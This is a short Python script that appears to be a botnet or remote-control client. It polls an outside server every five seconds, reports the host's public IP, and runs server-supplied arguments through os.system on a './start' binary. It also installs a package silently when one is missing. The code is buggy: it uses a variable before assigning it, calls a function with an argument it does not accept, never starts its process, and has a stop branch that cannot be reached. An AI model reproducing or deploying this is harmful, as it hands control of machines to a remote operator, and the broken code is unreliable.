import os

try:
    import requests
except:
    os.system("pip3 install requests")

import time

from multiprocessing import Process

hostname = requests.get("https://621311251521.host/dstat/ip.php").text

while True:
    time.sleep(5)
    pe = requests.get("https://621311251521.host/dstat/checkClient.php?hostname=" + hostname + "&returnip=" + requests.get("http://api.ipify.org/").text).text
    print("Client update sent.")
    if "EXEC" in pe:
        split = pe.split("|")
        last_command = split[1]
        execs = split[2]

        print(successful_exec)
        print(last_command)
        
        if successful_exec == last_command:
            pass
        else:
            print("Module sent | " + last_command)
            successful_exec = last_command
            def exec_cmd():
                os.system("./start " + execs)
            t = Process(target=exec_cmd(module=execs))
    elif "STOP_EXEC" in pe:
        try:
            t.terminate()
        except:
            pass
